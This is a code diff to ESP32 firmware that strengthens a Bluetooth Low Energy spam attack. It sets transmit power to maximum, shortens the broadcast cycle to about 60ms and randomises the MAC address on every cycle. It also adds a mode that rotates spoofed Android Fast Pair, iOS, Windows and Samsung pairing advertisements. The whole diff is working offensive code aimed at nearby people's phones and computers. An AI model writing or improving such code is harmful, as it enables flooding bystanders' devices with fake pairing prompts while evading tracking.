@@ -1,5 +1,6 @@
 #include "ble-module.h"
 #include <esp_mac.h>
+#include <esp_bt.h>
 
 void BLEModule::init() {
     currentState = MENU;
@@ -22,6 +23,11 @@ void BLEModule::init() {
         BLEDevice::init("ESP-Chain");
         bleInitialized = true;
     }
+    
+    // Set max power for "stronger" signal
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
 
     pBLEScan = BLEDevice::getScan();
     pBLEScan->setActiveScan(true);
@@ -43,8 +49,8 @@ void BLEModule::init() {
 
 void BLEModule::loop() {
     if (currentState == BLESPAM && isSpamming) {
-        // Spam loop
-        if (millis() - lastSpamUpdate > 200) { // 5Hz seems safer for stability
+        // Spam loop - Faster (60ms cycle approx)
+        if (millis() - lastSpamUpdate > 60) { 
             lastSpamUpdate = millis();
             
             pAdvertising->stop();
@@ -55,22 +61,36 @@ void BLEModule::loop() {
             esp_base_mac_addr_set(mac);
             
             // Re-init BLE to apply MAC change
+            // This is heavy but necessary for full MAC randomization with standard library
+            BLEDevice::deinit(); 
             BLEDevice::init(""); 
+            
+            // Re-set power after init
+            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+            
             pAdvertising = BLEDevice::getAdvertising();
             
+            // Determine Spam Type
+            SpamType typeToUse = currentSpamType;
+            if (currentSpamType == KITCHEN_SINK) {
+                // Randomly select one of the first 4 types
+                typeToUse = (SpamType)random(0, 4);
+            }
+
             // Get Payload
-            std::vector<uint8_t> payload = BLESpamUtils::getAdvertisementData(currentSpamType);
+            std::vector<uint8_t> payload = BLESpamUtils::getAdvertisementData(typeToUse);
             std::string dataStr((char*)payload.data(), payload.size());
             
             BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
             
-            if (currentSpamType == ANDROID_PAIR) {
+            if (typeToUse == ANDROID_PAIR) {
                 // Android Fast Pair Service Data
                 BLEUUID uuid((uint16_t)0xFE2C);
                 oAdvertisementData.setServiceData(uuid, dataStr);
+                oAdvertisementData.setCompleteServices(uuid); // Add the UUID announcement
                 oAdvertisementData.setFlags(0x06); // General Discoverable + BR/EDR Not Supported
             } else {
-                // Manufacturer Data for others
+                // Manufacturer Data for others (iOS, Windows, Samsung)
                 oAdvertisementData.setManufacturerData(dataStr);
             }
             
